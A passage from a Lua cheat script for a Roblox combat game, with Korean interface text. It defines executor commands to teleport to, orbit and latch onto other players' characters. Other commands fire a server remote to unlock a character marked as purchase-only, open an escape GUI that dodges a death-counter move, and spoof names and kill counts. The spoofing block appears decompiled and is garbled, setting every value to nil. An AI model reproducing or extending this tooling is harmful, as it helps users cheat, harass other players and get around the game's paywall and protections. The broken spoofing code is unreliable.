			end)
		end
	end)
end)

addcmd("unemotedash", { "unedash", "noedash", "noemotedash" }, function()
	getgenv().EmoteDashActive = false
	getgenv().EmoteDashPlaying = false
	notify("Emote Dash", "꺼졌습니다 ❌", 2)
end)

addcmd("resettp", {}, function(arg, arg2)
	local character = arg2.Character
	if not character then
		return
	end

	if not arg[1] then
		notify("오류", "대상을 입력해주세요. (예: ;resettp 이름)", 3)
		return
	end
	local v = getPlayer(arg[1], arg2)
	if not v or #v == 0 then
		notify("오류", "대상을 찾을 수 없습니다.", 3)
		return
	end
	local v2 = Players:FindFirstChild(v[1])
	if not v2 then
		return
	end
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")

	if humanoid and humanoid.Health > 0 then
		humanoid.Health = 0
	end

	notify("Reset", v2.Name .. " 에게 텔레포트 준비 중...", 2)

	task.spawn(function()
		local humanoidRootPart = arg2.CharacterAdded:Wait():WaitForChild("HumanoidRootPart", 10)

		if humanoidRootPart then
			task.wait(0.5)
			local character2 = v2.Character

			if character2 then
				local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart2 then
					humanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 0, -3)
					notify("Respawn", v2.Name .. " 에게 이동했습니다", 2)
				end
			end
		end
	end)

	getgenv().delvape("resettp")
end)

do
	local v = nil
	local v2 = nil
	local v3 = nil
	local value = 0
	local value2 = 0
	local flag2 = false

	local function fn2(arg)
		if not v or not flag2 then
			return
		end

		if arg.Name == v or arg.DisplayName == v or arg.Name == v2 then
			pcall(function()
				local v4 = arg
				local v5

				if v2 then
					v5 = nil
				else
					v5 = nil
				end

				v4.Name = v5
			end)

			pcall(function()
				local v4 = arg
				local v5 = nil

				if not v3 then
					v5 = nil
				end

				v4.DisplayName = v5 or nil
			end)

			if arg.Character then
				local humanoid = arg.Character:FindFirstChildWhichIsA("Humanoid")

				if humanoid then
					pcall(function()
						local v4 = humanoid
						local v5

						if not v3 then
							v5 = nil
						end

						v4.DisplayName = v5 or nil
					end)
				end
			end

			local leaderstats = arg:FindFirstChild("leaderstats")

			if leaderstats then
				for _, child in pairs(leaderstats:GetChildren()) do
					local str = child.Name:lower()

					if value > 0 and (str == "kill" or str == "kills") then
						pcall(function()
							child.Value = value
						end)
					elseif value2 > 0 and str:find("total") and str:find("kill") then
						pcall(function()
							child.Value = value2
						end)
					end
				end
			end
		end
	end

	local function fn3()
		if not flag2 or not v then
			return
		end

		pcall(function()
			local CoreGui = game:GetService("CoreGui")

			for _, descendant in pairs(CoreGui:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
					if descendant.Text == v or descendant.Text == v2 then
						local v4 = nil

						if not v3 then
							v4 = nil
						end

						descendant.Text = v4 or nil
					end

					local find = string.find
					local text = descendant.Text or ""
					local str = nil

					if not v then
						str = ""
					end

					local v4 = find(text, str)

					if not v4 then
						local find2 = string.find
						local text3 = descendant.Text or ""
						local str2 = nil

						if not v2 then
							str2 = ""
						end

						v4 = find2(text3, str2)
					end

					if v4 then
						local text3 = descendant.Text
						local v5 = nil

						if not v3 then
							v5 = nil
						end

						if text3 ~= (v5 or nil) then
							local v6 = nil

							if not v3 then
								v6 = nil
							end

							descendant.Text = v6 or nil
						end
					end
				end

				if descendant:IsA("TextBox") then
					if descendant.Text == v or descendant.Text == v2 then
						local v4 = nil

						if not v3 then
							v4 = nil
						end

						descendant.Text = v4 or nil
					end
				end
			end
		end)

		pcall(function()
			local robloxPlayerList = coreGui:FindFirstChild("RobloxPlayerList") or coreGui:FindFirstChild("PlayerList")

			if robloxPlayerList then
				for _, descendant in pairs(robloxPlayerList:GetDescendants()) do
					if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
						if descendant.Text == v or descendant.Text == v2 then
							local v4 = nil

							if not v3 then
								v4 = nil
							end

							descendant.Text = v4 or nil
						end
					end
				end
			end
		end)

		pcall(function()
			for _, player in pairs(game.Players:GetPlayers()) do
				if player.Name == v or player.DisplayName == v or player.Name == v2 then
					if player.Character then
						local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")

						if humanoid then
							local v4 = nil

							if not v3 then
								v4 = nil
							end

							humanoid.DisplayName = v4 or nil
						end

						local head = player.Character:FindFirstChild("Head")

						if head then
							for _, descendant in pairs(head:GetDescendants()) do
								if descendant:IsA("TextLabel") then
									local v4 = nil

									if not v3 then
										v4 = nil
									end

									descendant.Text = v4 or nil
								end
							end
						end
					end
				end
			end
		end)
	end

	task.spawn(function()
		while task.wait(0.05) do
			if flag2 then
				for _, player in pairs(game.Players:GetPlayers()) do
					fn2(player)
				end

				fn3()
			end
		end
	end)

	game.Players.PlayerAdded:Connect(function(player)
		task.wait(0.05)

		if flag2 then
			fn2(player)
		end
	end)

	game.Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(character)
			local flag3 = false

			if flag2 then
				flag3 = player.Name == v or player.DisplayName == v or player.Name == v2
			end

			if flag3 then
				task.wait(0.1)
				local humanoid = character:FindFirstChildWhichIsA("Humanoid")

				if humanoid then
					pcall(function()
						local v4 = humanoid
						local v5 = nil

						if not v3 then
							v5 = nil
						end

						v4.DisplayName = v5 or nil
					end)
				end
			end
		end)
	end)

	task.spawn(function()
		while task.wait(0.02) do
			if flag2 then
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Name == v or player.DisplayName == v or player.Name == v2 then
						if player.Character then
							local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")

							if humanoid then
								local displayName = humanoid.DisplayName
								local v4 = nil

								if not v3 then
									v4 = nil
								end

								if displayName ~= (v4 or nil) then
									pcall(function()
										local v5 = humanoid
										local v6

										if not v3 then
											v6 = nil
										end

										v5.DisplayName = v6 or nil
									end)
								end
							end
						end
					end
				end
			end
		end
	end)
end

addcmd("antideathcountergui", { "adcgui" }, function()
	pcall(function()
		local Players_ = game:GetService("Players")
		local UserInputService_2 = game:GetService("UserInputService")
		local localPlayer = Players_.LocalPlayer
		local currentCamera = workspace.CurrentCamera
		local playerGui = localPlayer:WaitForChild("PlayerGui")

		local function fn2()
			local unknownSafetyPlatform = workspace:FindFirstChild("Unknown_Safety_Platform")

			if not unknownSafetyPlatform then
				local part = Instance.new("Part")
				part.Name = "Unknown_Safety_Platform"
				part.Size = Vector3.new(100, 1.5, 100)
				part.Anchored = true
				part.CanCollide = true
				part.Material = Enum.Material.Neon
				part.Color = Color3.fromRGB(0, 255, 150)
				part.CFrame = CFrame.new(-363.4, -501.2, 643.7)
				part.Parent = workspace
				return part
			end

			return unknownSafetyPlatform
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "언노운안티데스카운터"
		screenGui2.ResetOnSpawn = false
		screenGui2.Parent = playerGui
		local frame2 = Instance.new("Frame")
		frame2.Size = UDim2.new(0, 250, 0, 130)
		frame2.Position = UDim2.new(0.5, -125, 0.5, -65)
		frame2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		frame2.Active = true
		frame2.Parent = screenGui2
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 10)
		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, 0, 0, 35)
		frame3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		frame3.Parent = frame2
		Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -45, 1, 0)
		textLabel.Position = UDim2.new(0, 15, 0, 0)
		textLabel.Text = "언노운 안티데스카운터"
		textLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 14
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Size = UDim2.new(0, 25, 0, 25)
		textButton2.Position = UDim2.new(1, -30, 0.5, -12.5)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.new(1, 1, 1)
		textButton2.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
		textButton2.Parent = frame3
		Instance.new("UICorner", textButton2).CornerRadius = UDim.new(1, 0)
		local textButton3 = Instance.new("TextButton")
		textButton3.Size = UDim2.new(0, 210, 0, 50)
		textButton3.Position = UDim2.new(0, 20, 0, 60)
		textButton3.Text = "실행"
		textButton3.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
		textButton3.TextColor3 = Color3.new(1, 1, 1)
		textButton3.Font = Enum.Font.GothamBold
		textButton3.Parent = frame2
		Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 8)
		local flag2 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag2 = true
				position = input.Position
				position2 = frame2.Position
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if flag2 and input.UserInputType == Enum.UserInputType.MouseMovement then
				local n = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end
		end)

		UserInputService_2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag2 = false
			end
		end)

		textButton3.MouseButton1Click:Connect(function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChild("Humanoid")

			if humanoidRootPart and humanoid then
				local cFrame = humanoidRootPart.CFrame
				humanoidRootPart.CFrame = fn2().CFrame + Vector3.new(0, 5, 0)
				task.wait(2.5)
				humanoidRootPart.CFrame = cFrame
				currentCamera.CameraType = Enum.CameraType.Custom
				currentCamera.CameraSubject = humanoid

				task.delay(0.1, function()
					currentCamera.CameraType = Enum.CameraType.Custom
					currentCamera.CameraSubject = humanoid
				end)
			end
		end)

		textButton2.MouseButton1Click:Connect(function()
			screenGui2:Destroy()
			getgenv().delvape("antideathcountergui")
		end)
	end)
end)

addcmd("crabadd", { "crabspawn" }, function(arg, arg2)
	local character = arg2.Character
	if not character then
		notify("Error", "Character를 찾을 수 없습니다")
		return
	end
	local communicate = character:FindFirstChild("Communicate")

	if communicate then
		pcall(function()
			communicate:FireServer({ Goal = "Change Character", Character = "Crab Boss" })
			getgenv().delvape("crabadd")
			notify("Crab Boss", "Crab Boss 스폰메시지를 스폰했습니다 (구매필요)", 2)
		end)
	else
		notify("Error", "Communicate 객체를 찾을 수 없습니다")
	end
end)

do
	local Players_ = game:GetService("Players")
	local RunService_2 = game:GetService("RunService")
	local localPlayer = Players_.LocalPlayer
	local n = 50
	local n2 = 5
	local cframe = CFrame.new(0, 0, 0)
	local flag2 = false
	local humanoidRootPart = nil
	local n3 = 0

	RunService_2.Heartbeat:Connect(function(deltaTime)
		if not flag2 or not humanoidRootPart or not humanoidRootPart.Parent then
			return
		end
		local character = localPlayer.Character
		character = character and character:FindFirstChild("HumanoidRootPart")

		if character then
			n3 += n * deltaTime
			character.CFrame = CFrame.lookAt(humanoidRootPart.Position + Vector3.new(math.cos(n3) * n2, 0, math.sin(n3) * n2), humanoidRootPart.Position) * cframe
		end
	end)

	addcmd("orbit", {}, function(arg, arg2)
		if arg[1] then
			local v = getPlayer(arg[1], arg2)

			if v and #v > 0 then
				local v2 = Players_:FindFirstChild(v[1])

				if v2 and v2.Character and v2.Character:FindFirstChild("HumanoidRootPart") then
					humanoidRootPart = v2.Character.HumanoidRootPart
					flag2 = true
					notify("Orbit", v2.Name .. " 대상 추적 공전 시작", 3)
				end
			end
		else
			notify("오류", "대상을 입력해주세요", 3)
		end
	end)

	addcmd("unorbit", {}, function()
		flag2 = false
		humanoidRootPart = nil
		notify("Orbit", "공전 중단됨", 3)
	end)
end

local Players_ = game:GetService("Players")
game:GetService("RunService")
CFrame.new(0, 0, 0)
local localPlayer

do
	local Players_2 = game:GetService("Players")
	local RunService_2 = game:GetService("RunService")
	localPlayer = Players_2.LocalPlayer
	getgenv().AttachOffset = CFrame.new(0, 0, 6)
	local flag2 = false
	local humanoidRootPart = nil
	local v = nil
	local connection = nil
	local v2 = nil
	local humanoidRootPart2 = nil

	local function fn2(character)
		v2 = character
		humanoidRootPart2 = character:WaitForChild("HumanoidRootPart")
		setPhysicsRep(humanoidRootPart2, nil)
	end

	if localPlayer.Character then
		fn2(localPlayer.Character)
	end

	localPlayer.CharacterAdded:Connect(fn2)

	RunService_2.Heartbeat:Connect(function()
		if not flag2 or not humanoidRootPart or not humanoidRootPart.Parent or not humanoidRootPart2 then
			return
		end

		pcall(function()
			setPhysicsRep(humanoidRootPart2, humanoidRootPart)
		end)

		humanoidRootPart2.CFrame = humanoidRootPart.CFrame * getgenv().AttachOffset
	end)

	local function fn3(arg)
		if connection then
			connection:Disconnect()
		end

		v = arg
		flag2 = true

		if arg.Character and arg.Character:FindFirstChild("HumanoidRootPart") then
			humanoidRootPart = arg.Character.HumanoidRootPart
		end

		connection = arg.CharacterAdded:Connect(function(character)
			local humanoidRootPart3 = character:WaitForChild("HumanoidRootPart", 5)

			if humanoidRootPart3 then
				humanoidRootPart = humanoidRootPart3
				notify("Attach", arg.Name .. " 부활 감지, 재부착 완료", 2)
			end
		end)
	end

	addcmd("attach", { "looptp", "at" }, function(arg, arg2)
		if arg[1] then
			local v3 = getPlayer(arg[1], arg2)

			if v3 and #v3 > 0 then
				local v4 = Players_2:FindFirstChild(v3[1])

				if v4 then
					fn3(v4)

					if getgenv().addTargetCmd then
						getgenv().addTargetCmd(v4, "attach")
					end

					notify("Attach", v4.Name .. " 유착 및 자동 추적 시작", 3)
				end
			end
		else
			notify("오류", "대상을 입력해주세요.", 3)
		end
	end)

	addcmd("unattach", { "unlooptp", "unat" }, function(arg)
		flag2 = false
		humanoidRootPart = nil
		v = nil

		if connection then
			connection:Disconnect()
		end

		setPhysicsRep(humanoidRootPart2, nil)

		if getgenv().removeTargetCmd then
			if arg[1] then
				local v3 = arg[1]
				getgenv().removeTargetCmd(v3, "attach")
			else
				getgenv().removeTargetCmd(nil, "attach")
			end
		end

		if getgenv().delvape then
			getgenv().delvape("attach")
			getgenv().delvape("at")
			getgenv().delvape("looptp")
			getgenv().delvape("setat")
			getgenv().delvape("setattach")
		end

		notify("Attach", "모든 추적 및 유착 해제됨", 3)
	end)

	addcmd("setat", { "setattach" }, function(arg, arg2)
		local playerGui = arg2:WaitForChild("PlayerGui")

		if playerGui:FindFirstChild("SetAttachGUI") then
			playerGui.SetAttachGUI:Destroy()
		end

		local UserInputService_2 = game:GetService("UserInputService")
		local screenGui2 = Instance.new("ScreenGui", playerGui)
		screenGui2.Name = "SetAttachGUI"
		screenGui2.ResetOnSpawn = false
		local frame2 = Instance.new("Frame", screenGui2)
		frame2.Size = UDim2.new(0, 460, 0, 475)
		frame2.Position = UDim2.new(0.5, -230, 0.5, -237)
		frame2.BackgroundColor3 = Color3.fromRGB(24, 25, 32)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		frame2.ClipsDescendants = true
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 10)
		local uiStroke3 = Instance.new("UIStroke", frame2)
		uiStroke3.Color = Color3.fromRGB(55, 60, 75)
		uiStroke3.Thickness = 1.5
		local frame3 = Instance.new("Frame", frame2)
		frame3.Size = UDim2.new(1, 0, 0, 38)
		frame3.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
		frame3.BorderSizePixel = 0
		Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
		local textLabel = Instance.new("TextLabel", frame3)
		textLabel.Size = UDim2.new(1, -120, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
		textLabel.Text = "attach set"
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 14
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		local flag3 = false
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag3 = true
				position = input.Position
				position2 = frame2.Position
				local connection2 = nil

				connection2 = UserInputService_2.InputEnded:Connect(function(input2)
					if input2.UserInputType == Enum.UserInputType.MouseButton1 or input2.UserInputType == Enum.UserInputType.Touch then
						flag3 = false

						if connection2 then
							connection2:Disconnect()
						end
					end
				end)
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			local flag4 = flag3

			if flag3 then
				flag4 = input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch
			end

			if flag4 then
				local n = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end
		end)

		local textButton2 = Instance.new("TextButton", frame3)
		textButton2.Size = UDim2.new(0, 26, 0, 26)
		textButton2.Position = UDim2.new(1, -32, 0, 6)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton2.TextColor3 = Color3.new(1, 1, 1)
		textButton2.Text = "X"
		textButton2.Font = Enum.Font.GothamBold
		textButton2.TextSize = 13
		textButton2.BorderSizePixel = 0
		Instance.new("UICorner", textButton2).CornerRadius = UDim.new(0, 6)

		textButton2.MouseButton1Click:Connect(function()
			if getgenv().delvape then
				getgenv().delvape("setat")
				getgenv().delvape("setattach")
			end

			pcall(function()
				screenGui2:Destroy()
			end)
		end)

		screenGui2.Destroying:Connect(function()
			if getgenv().delvape then
				getgenv().delvape("setat")
				getgenv().delvape("setattach")
			end
		end)

		local position3 = getgenv().AttachOffset and getgenv().AttachOffset.Position or Vector3.new(0, 0, 6)
		local n = 0
		local n2 = 0
		local n3 = 0

		pcall(function()
			if getgenv().AttachOffset then
				local v3, v4, v5 = getgenv().AttachOffset:ToOrientation()
				n = v3
				n2 = v4
				n3 = v5
			end
		end)

		local n4 = math.deg(n)
		local n5 = math.deg(n2)
		local n6 = math.deg(n3)
		local v3 = n4
		local v4 = n5
		local v5 = n6
		local x = position3.X
		local y = position3.Y
		local z = position3.Z
		local frame4 = Instance.new("Frame", frame2)
		frame4.Size = UDim2.new(0, 216, 0, 345)
		frame4.Position = UDim2.new(0, 12, 0, 46)
		frame4.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
		frame4.BorderSizePixel = 0
		Instance.new("UICorner", frame4).CornerRadius = UDim.new(0, 8)
		local textLabel2 = Instance.new("TextLabel", frame4)
		textLabel2.Size = UDim2.new(1, 0, 0, 24)
		textLabel2.Position = UDim2.new(0, 0, 0, 4)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "각도 그래프"
		textLabel2.TextColor3 = Color3.fromRGB(0, 200, 255)
		textLabel2.Font = Enum.Font.GothamBold
		textLabel2.TextSize = 12
		local frame5 = Instance.new("Frame", frame4)
		frame5.Name = "GraphBox"
		frame5.Size = UDim2.new(0, 180, 0, 180)
		frame5.Position = UDim2.new(0.5, -90, 0, 30)
		frame5.BackgroundColor3 = Color3.fromRGB(12, 13, 18)
		frame5.BorderSizePixel = 0
		frame5.ClipsDescendants = true
		Instance.new("UICorner", frame5).CornerRadius = UDim.new(0, 6)
		local uiStroke4 = Instance.new("UIStroke", frame5)
		uiStroke4.Color = Color3.fromRGB(40, 50, 70)
		uiStroke4.Thickness = 1

		for _, v6 in ipairs({ 45, 90, 135 }) do
			local frame6 = Instance.new("Frame", frame5)
			local n7 = v6 / 180 * 180
			frame6.Size = UDim2.new(0, n7, 0, n7)
			frame6.Position = UDim2.new(0.5, -n7 / 2, 0.5, -n7 / 2)
			frame6.BackgroundTransparency = 1
			Instance.new("UICorner", frame6).CornerRadius = UDim.new(1, 0)
			local uiStroke5 = Instance.new("UIStroke", frame6)
			uiStroke5.Color = Color3.fromRGB(30, 38, 52)
			uiStroke5.Thickness = 1
		end

		local frame6 = Instance.new("Frame", frame5)
		frame6.Size = UDim2.new(1, 0, 0, 1)
		frame6.Position = UDim2.new(0, 0, 0.5, 0)
		frame6.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		frame6.BackgroundTransparency = 0.5
		frame6.BorderSizePixel = 0
		local frame7 = Instance.new("Frame", frame5)
		frame7.Size = UDim2.new(0, 1, 1, 0)
		frame7.Position = UDim2.new(0.5, 0, 0, 0)
		frame7.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		frame7.BackgroundTransparency = 0.5
		frame7.BorderSizePixel = 0

		local function fn4(text, position4, textXAlignment)
			local textLabel3 = Instance.new("TextLabel", frame5)
			textLabel3.Size = UDim2.new(0, 42, 0, 14)
			textLabel3.Position = position4
			textLabel3.BackgroundTransparency = 1
			textLabel3.Text = text
			textLabel3.TextColor3 = Color3.fromRGB(90, 110, 140)
			textLabel3.Font = Enum.Font.GothamBold
			textLabel3.TextSize = 9
			textLabel3.TextXAlignment = textXAlignment
		end

		local center = Enum.TextXAlignment.Center
		fn4("위 +90°", UDim2.new(0.5, -21, 0, 2), center)
		local center2 = Enum.TextXAlignment.Center
		fn4("아래 -90°", UDim2.new(0.5, -21, 1, -16), center2)
		local left = Enum.TextXAlignment.Left
		fn4("좌-180°", UDim2.new(0, 2, 0.5, -7), left)
		local right = Enum.TextXAlignment.Right
		fn4("우+180°", UDim2.new(1, -44, 0.5, -7), right)
		local frame8 = Instance.new("Frame", frame5)
		frame8.Size = UDim2.new(0, 4, 0, 4)
		frame8.Position = UDim2.new(0.5, -2, 0.5, -2)
		frame8.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
		Instance.new("UICorner", frame8).CornerRadius = UDim.new(1, 0)
		local frame9 = Instance.new("Frame", frame5)
		frame9.AnchorPoint = Vector2.new(0, 0.5)
		frame9.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame9.Size = UDim2.new(0, 0, 0, 2)
		frame9.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
		frame9.BorderSizePixel = 0
		local frame10 = Instance.new("Frame", frame5)
		frame10.Size = UDim2.new(0, 14, 0, 14)
		frame10.AnchorPoint = Vector2.new(0.5, 0.5)
		frame10.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame10.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
		frame10.BorderSizePixel = 0
		frame10.ZIndex = 5
		Instance.new("UICorner", frame10).CornerRadius = UDim.new(1, 0)
		local uiStroke5 = Instance.new("UIStroke", frame10)
		uiStroke5.Color = Color3.fromRGB(255, 255, 255)
		uiStroke5.Thickness = 1.5
		local textLabel3 = Instance.new("TextLabel", frame4)
		textLabel3.Size = UDim2.new(1, -20, 0, 18)
		textLabel3.Position = UDim2.new(0, 10, 0, 218)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "Roll (Z축 기울기): 0°"
		textLabel3.TextColor3 = Color3.fromRGB(220, 220, 230)
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextSize = 11
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		local frame11 = Instance.new("Frame", frame4)
		frame11.Size = UDim2.new(0, 180, 0, 16)
		frame11.Position = UDim2.new(0.5, -90, 0, 240)
		frame11.BackgroundColor3 = Color3.fromRGB(30, 32, 42)
		frame11.BorderSizePixel = 0
		Instance.new("UICorner", frame11).CornerRadius = UDim.new(0, 8)
		local frame12 = Instance.new("Frame", frame11)
		frame12.Size = UDim2.new(0.5, 0, 1, 0)
		frame12.Position = UDim2.new(0, 0, 0, 0)
		frame12.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
		frame12.BorderSizePixel = 0
		Instance.new("UICorner", frame12).CornerRadius = UDim.new(0, 8)
		local frame13 = Instance.new("Frame", frame11)
		frame13.Size = UDim2.new(0, 14, 0, 20)
		frame13.AnchorPoint = Vector2.new(0.5, 0.5)
		frame13.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame13.BorderSizePixel = 0
		Instance.new("UICorner", frame13).CornerRadius = UDim.new(0, 4)
		local textLabel4 = Instance.new("TextLabel", frame4)
		textLabel4.Size = UDim2.new(1, -10, 0, 60)
		textLabel4.Position = UDim2.new(0, 5, 0, 265)
		textLabel4.BackgroundTransparency = 1

		textLabel4.Text = [[💡 마우스로 그래프/슬라이더 드래그 시
GUI 창 이동 없이 각도만 부드럽게 조절됩니다.
(X: 좌우 Yaw / Y: 상하 Pitch)]]

		textLabel4.TextColor3 = Color3.fromRGB(130, 145, 170)
		textLabel4.Font = Enum.Font.Gotham
		textLabel4.TextSize = 10
		textLabel4.TextYAlignment = Enum.TextYAlignment.Top
		local frame14 = Instance.new("Frame", frame2)
		frame14.Size = UDim2.new(0, 214, 0, 345)
		frame14.Position = UDim2.new(0, 234, 0, 46)
		frame14.BackgroundColor3 = Color3.fromRGB(18, 19, 25)
		frame14.BorderSizePixel = 0
		Instance.new("UICorner", frame14).CornerRadius = UDim.new(0, 8)
		local textLabel5 = Instance.new("TextLabel", frame14)
		textLabel5.Size = UDim2.new(1, 0, 0, 24)
		textLabel5.Position = UDim2.new(0, 0, 0, 4)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Text = "기울기 보기"
		textLabel5.TextColor3 = Color3.fromRGB(0, 255, 170)
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextSize = 12
		local frame15 = Instance.new("Frame", frame14)
		frame15.Size = UDim2.new(0, 92, 0, 92)
		frame15.Position = UDim2.new(0.5, -46, 0, 28)
		frame15.BackgroundColor3 = Color3.fromRGB(12, 16, 24)
		frame15.BorderSizePixel = 0
		frame15.ClipsDescendants = true
		Instance.new("UICorner", frame15).CornerRadius = UDim.new(1, 0)
		local uiStroke6 = Instance.new("UIStroke", frame15)
		uiStroke6.Color = Color3.fromRGB(0, 200, 255)
		uiStroke6.Thickness = 2

		local function fn5(arg3, arg4, backgroundColor3)
			local frame16 = Instance.new("Frame", frame15)
			frame16.Size = UDim2.new(0, arg4, 0, 1)
			frame16.Position = UDim2.new(0.5, -arg4 / 2, 0.5, arg3)
			frame16.BackgroundColor3 = backgroundColor3 or Color3.fromRGB(60, 80, 110)
			frame16.BorderSizePixel = 0
		end

		fn5(-20, 20, Color3.fromRGB(0, 170, 255))
		fn5(20, 20, Color3.fromRGB(255, 150, 50))
		local frame16 = Instance.new("Frame", frame15)
		frame16.Size = UDim2.new(0, 62, 0, 26)
		frame16.AnchorPoint = Vector2.new(0.5, 0.5)
		frame16.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame16.BackgroundTransparency = 1
		local frame17 = Instance.new("Frame", frame16)
		frame17.Size = UDim2.new(1, 0, 0, 2)
		frame17.Position = UDim2.new(0, 0, 0.5, -1)
		frame17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame17.BorderSizePixel = 0
		local frame18 = Instance.new("Frame", frame16)
		frame18.Size = UDim2.new(0, 16, 0, 2)
		frame18.Position = UDim2.new(0.5, -8, 0, 2)
		frame18.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
		frame18.BorderSizePixel = 0
		local frame19 = Instance.new("Frame", frame16)
		frame19.Size = UDim2.new(0, 16, 0, 2)
		frame19.Position = UDim2.new(0.5, -8, 1, -4)
		frame19.BackgroundColor3 = Color3.fromRGB(255, 140, 50)
		frame19.BorderSizePixel = 0
		local frame20 = Instance.new("Frame", frame15)
		frame20.Size = UDim2.new(0, 4, 0, 4)
		frame20.Position = UDim2.new(0.5, -2, 0.5, -2)
		frame20.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
		frame20.BorderSizePixel = 0
		frame20.ZIndex = 5
		Instance.new("UICorner", frame20).CornerRadius = UDim.new(1, 0)
		local frame21 = Instance.new("Frame", frame15)
		frame21.Size = UDim2.new(0, 12, 0, 2)
		frame21.Position = UDim2.new(0.5, -18, 0.5, -1)
		frame21.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
		frame21.BorderSizePixel = 0
		frame21.ZIndex = 5
		local frame22 = Instance.new("Frame", frame15)
		frame22.Size = UDim2.new(0, 12, 0, 2)
		frame22.Position = UDim2.new(0.5, 6, 0.5, -1)
		frame22.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
		frame22.BorderSizePixel = 0
		frame22.ZIndex = 5
		local textLabel6 = Instance.new("TextLabel", frame14)
		textLabel6.Size = UDim2.new(1, -16, 0, 34)
		textLabel6.Position = UDim2.new(0, 8, 0, 126)
		textLabel6.BackgroundTransparency = 1
		textLabel6.Text = "Pitch: 0.0° | Yaw: 0.0°\nRoll: 0.0°"
		textLabel6.TextColor3 = Color3.fromRGB(240, 245, 255)
		textLabel6.Font = Enum.Font.GothamBold
		textLabel6.TextSize = 10
		textLabel6.TextYAlignment = Enum.TextYAlignment.Center

		local function createTextBox(arg3, text, arg4, text3)
			local textLabel7 = Instance.new("TextLabel", arg3)
			textLabel7.Size = UDim2.new(0, 62, 0, 20)
			textLabel7.Position = UDim2.new(0, 8, 0, arg4)
			textLabel7.BackgroundTransparency = 1
			textLabel7.Text = text
			textLabel7.TextColor3 = Color3.fromRGB(180, 190, 205)
			textLabel7.Font = Enum.Font.Gotham
			textLabel7.TextSize = 10
			textLabel7.TextXAlignment = Enum.TextXAlignment.Left
			local textBox = Instance.new("TextBox", arg3)
			textBox.Size = UDim2.new(0, 130, 0, 20)
			textBox.Position = UDim2.new(0, 72, 0, arg4)
			textBox.BackgroundColor3 = Color3.fromRGB(30, 32, 42)
			textBox.TextColor3 = Color3.new(1, 1, 1)
			textBox.Text = text3
			textBox.Font = Enum.Font.GothamBold
			textBox.TextSize = 10
			textBox.ClearTextOnFocus = false
			Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 4)
			return textBox
		end

